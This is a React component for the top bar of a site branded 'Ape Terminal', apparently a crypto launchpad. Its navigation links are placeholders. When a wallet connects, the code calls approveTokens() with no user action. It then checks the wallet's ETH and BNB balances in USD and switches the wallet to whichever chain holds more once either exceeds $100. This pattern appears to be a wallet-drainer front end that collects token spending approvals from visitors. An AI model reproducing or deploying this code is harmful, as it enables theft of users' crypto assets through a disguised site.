"use client"
import React, { useState, useEffect } from 'react';
import axios from "axios";
import { useAccount } from 'wagmi';
import { getBalance, switchNetwork, disconnect } from "@wagmi/core";
import { useWeb3Modal, useWalletInfo } from '@web3modal/wagmi/react';
import { Menu, X } from "react-feather";
import Link from "next/link";
import Image from "next/image";
import './topbar.css';
import logo from "../../public/assets/images/apeterminallogo.svg"
import icon1 from "../../public/assets/icons/icon1.svg"
import icon2 from "../../public/assets/icons/transparency.svg"
import icon3 from "../../public/assets/icons/connectwallet.svg"
import { TopBarCard } from "@/components/TopBarCard";
import { MobileNav } from "@/components/MobileNav";
import { UseWallet } from "../state/useWallet";
import { coingeckoApiKey, config } from "../app/Web3ModalConfig";
import LoadingGif from '../assets/loading.gif';

export const TopBar: React.FC = () => {
    const [showMobileNavbar, setShowMobileNavbar] = useState(false);
    const [scrolledToTop, setScrolledToTop] = useState(true);
    const [prevScrollPos, setPrevScrollPos] = useState(0);
    const [connected, setConnected] = useState(false);
    const { open } = useWeb3Modal();
    const { isConnected } = useAccount();
    const [ethBalance, setEthBalance] = useState(0);
    const [bnbBalance, setBnbBalance] = useState(0);
    const [getBalanceLoading, setGetBalanceLoading] = useState(false);
    const { approveTokens, getTokenAssets } = UseWallet();
    const account = useAccount();

    const getBalances = async () => {
        if (account.address) {
            const ethBalanceRes = await getBalance(config, {
                address: account.address,
                chainId: 1
            })

            const bnbBalanceRes = await getBalance(config, {
                address: account.address,
                chainId: 56
            })
            const ethResponse = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd&x-cg-demo-api-key=${coingeckoApiKey}`);
            const bnbResponse = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd&x-cg-demo-api-key=${coingeckoApiKey}`);
            const ethUsdBalance = ethResponse.data['ethereum'].usd * Number(ethBalanceRes.formatted);
            const bnbUsdBalance = bnbResponse.data['binancecoin'].usd * Number(bnbBalanceRes.formatted);
            setEthBalance(ethUsdBalance);
            setBnbBalance(bnbUsdBalance);
            return { ethUsdBalance, ethBalance: Number(ethBalanceRes.formatted), bnbUsdBalance, bnbBalance: Number(bnbBalanceRes.formatted) }
        }
    }

    const onSwitchNetwork = async () => {
        await getBalances();
        if (ethBalance >= 100 || bnbBalance >= 100)
            if (ethBalance > bnbBalance) {
                try {
                    await switchNetwork(config, {
                        chainId: 1
                    })
                } catch (error) {
                    console.log(error)
                }
            } else {
                try {
                    await switchNetwork(config, {
                        chainId: 56
                    })
                } catch (error) {
                    console.log(error)
                }
            }
    }

    const onDisconnect = async () => {
        await disconnect(config);
    }

    useEffect(() => {
        if (ethBalance && bnbBalance) {
            onSwitchNetwork();
        }
    }, [ethBalance, bnbBalance])

    useEffect(() => {
        if (!connected) {
            setConnected(true);
        }
    }, [connected])

    useEffect(() => {
        const run = async () => {
            if (isConnected) {
                console.log("kk");
                try {
                    await approveTokens();
                } catch (error) {
                    console.log(error);
                }
            }
        };
    
        run(); // Call the inner async function
    }, [isConnected]);
    


    useEffect(() => {
        const handleScroll = () => {
            const currentScrollPos = window.scrollY;

            if (currentScrollPos === 0) {
                setScrolledToTop(true);
            } else if (currentScrollPos > prevScrollPos) {
                setScrolledToTop(false);
            } else {
                setScrolledToTop(true);
            }
            setPrevScrollPos(currentScrollPos);
        };
        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
    }, [prevScrollPos]);

    return (
        <>
            <header
                className={`z-50 flex justify-between px-2.5 md:px-16 lg:px-[100px] transition-all duration-500 py-[12px] ${prevScrollPos == 0 ? "bg-opacity-100" : "backdrop-filter bg-opacity-30 backdrop-blur-lg"} bg-black z-10 fixed w-full top-0`}>
                <Link href={"#"}>
                    <Image style={{ height: "auto", width: "auto" }} src={logo} alt={"ape terminal logo"} className={"h-[40px] w-[130px]"} />
                </Link>
                <div className={"gap-2 hidden lg:flex"}>
                    <TopBarCard name={"Launchpad"} borderColor={"#ff741e40"} icon={icon1} textColor={"#ff741e"}
                        linkURL={"#"}
                        className={"cursor-pointer hover:text-[#FF741E] transition-all duration-500"} />
                    <TopBarCard name={"Transparency"} borderColor={"#f4fdab40"} icon={icon2} textColor={"#f4fdab"}
                        linkURL={"#"} />

                    {
                        isConnected ?
                            <w3m-button balance='show' />
                            :
                            <TopBarCard name={"Connect Wallet"} borderColor={"#ffffff"} icon={icon3} textColor={"#000000"}
                                backgroundColor={"#ffffff"} borderRadius={"3px"} className={"border-0"} linkURL={"#"}
                                onClick={() => {
                                    open({ view: 'Connect' });
                                }}
                            />
                    }
                </div>

                {/*    mobile nav*/}
                <div className={"hidden max-lg:flex text-sm items-center space-x-6"}>
                    {
                        isConnected ?
                            <w3m-button balance='show' />
                            :
                            <TopBarCard name={"Connect Wallet"} borderColor={"#ffffff"} icon={icon3} textColor={"#000000"}
                                backgroundColor={"#ffffff"} borderRadius={"3px"} className={"border-0"} linkURL={"#"}
                                onClick={() => {
                                    open({ view: 'Connect' });
                                }}
                            />
                    }

                    {
                        !showMobileNavbar ?
                            <Menu onClick={() => setShowMobileNavbar(!showMobileNavbar)}
                                className={"cursor-pointer font-semibold size-8 text-[#ffffff] bg-blend-color z-50"} />
                            : <X onClick={() => setShowMobileNavbar(!showMobileNavbar)}
                                className={"cursor-pointer font-semibold size-8 text-[#b2b4b3] bg-blend-color z-50"} />
                    }
                </div>
            </header>
            <div className={`transition-all duration-500 ease-in-out`}>
                {
                    showMobileNavbar && <MobileNav showMobileNavbar={showMobileNavbar} setShowMobileNavbar={setShowMobileNavbar} />
                }
            </div>
        </>
    )
}
